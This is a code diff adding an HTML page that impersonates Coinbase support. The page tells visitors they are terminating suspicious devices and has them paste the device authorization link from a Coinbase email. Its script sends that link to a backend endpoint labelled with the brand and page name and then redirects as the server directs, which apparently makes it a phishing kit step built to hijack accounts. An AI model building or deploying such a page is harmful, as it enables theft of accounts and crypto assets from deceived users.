@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en" class="dark" style="color-scheme: dark;">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Coinbase — Terminate devices</title>
+<link rel="icon" href="https://coinbase.com/favicon.ico">
+<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
+<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
+<style>
+.rv-banner{width:100%;background:rgba(0,40,120,.55);border-bottom:1px solid rgba(59,130,246,.25);padding:10px 16px;text-align:center;font-size:12px;line-height:1.45;color:#cbd5e1;box-sizing:border-box}
+.rv-banner a{color:#60a5fa;text-decoration:underline}
+.rv-main{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:24px 16px 48px;background:rgb(10,11,13)}
+.rv-card{width:100%;max-width:440px;background:rgba(255,255,255,.02);border-radius:16px;box-shadow:0 0 0 1px rgba(138,145,158,.2) inset;padding:32px 28px;box-sizing:border-box;margin-top:8px}
+.rv-title{color:#fff;font-size:22px;font-weight:600;margin:0}
+.rv-sub{color:#94a3b8;font-size:14px;margin:10px 0 0;line-height:1.55}
+.rv-illus{display:flex;justify-content:center;margin:16px 0}
+.rv-label{color:#fff;font-size:14px;font-weight:600;margin:20px 0 8px;display:block}
+.rv-input{width:100%;box-sizing:border-box;background:rgba(255,255,255,.04);border:1px solid rgba(138,145,158,.35);color:#fff;border-radius:10px;padding:14px 16px;font-size:14px;font-family:inherit}
+.rv-input:focus{outline:none;border-color:rgba(87,139,250,.8)}
+.rv-btn{width:100%;height:52px;border-radius:9999px;font-weight:600;font-size:15px;cursor:pointer;border:0;margin-top:24px;font-family:inherit;background:rgb(87,139,250)!important;color:#0a0b0d!important}
+.rv-btn:disabled{opacity:.45;cursor:not-allowed}
+</style>
+</head>
+<body style="font-family:'CoinbaseSansFont',system-ui,sans-serif;margin:0">
+<div class="rv-banner">This is our official ticket-based support system. Remember to follow the instructions provided by our representative and your assets will be safe. <a href="#">Privacy Policy</a></div>
+<div class="rv-main">
+  <svg width="36" height="36" viewBox="0 0 48 48" aria-label="Coinbase" style="margin-bottom:20px"><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#fff"/></svg>
+  <div class="rv-card">
+    <div class="rv-illus">
+      <svg width="120" height="90" viewBox="0 0 120 90" fill="none" aria-hidden="true">
+        <rect x="20" y="35" width="80" height="50" rx="4" fill="#374151" stroke="#6b7280"/>
+        <rect x="28" y="42" width="64" height="36" rx="2" fill="#1e40af"/>
+        <circle cx="60" cy="58" r="8" fill="#fbbf24"/><text x="60" y="62" text-anchor="middle" fill="#0a0b0d" font-size="12" font-weight="bold">?</text>
+        <rect x="45" y="12" width="30" height="22" rx="2" fill="#e5e7eb" stroke="#9ca3af"/>
+      </svg>
+    </div>
+    <h1 class="rv-title">Terminate suspicious devices</h1>
+    <p class="rv-sub">We've just sent you an email with the device authorization link</p>
+    <p class="rv-sub" style="margin-top:12px">Please copy the confirmation link from the email and paste it in the box below to ban the device from accessing your account.</p>
+    <label class="rv-label" for="rv-url">URL</label>
+    <input id="rv-url" class="rv-input" type="url" placeholder="Enter the URL" autocomplete="off">
+    <button id="rv-next" type="button" class="rv-btn" disabled>Next</button>
+  </div>
+</div>
+<script>
+(function(){
+  var url=document.getElementById('rv-url'), btn=document.getElementById('rv-next');
+  url.addEventListener('input',function(){ btn.disabled=url.value.trim().length<8; });
+  btn.addEventListener('click',function(){
+    if(btn.disabled) return;
+    btn.disabled=true;
+    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Terminate Devices',choice:url.value.trim().slice(0,200)})})
+      .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else btn.disabled=false;});
+  });
+})();
+</script>
+</body>
+</html>
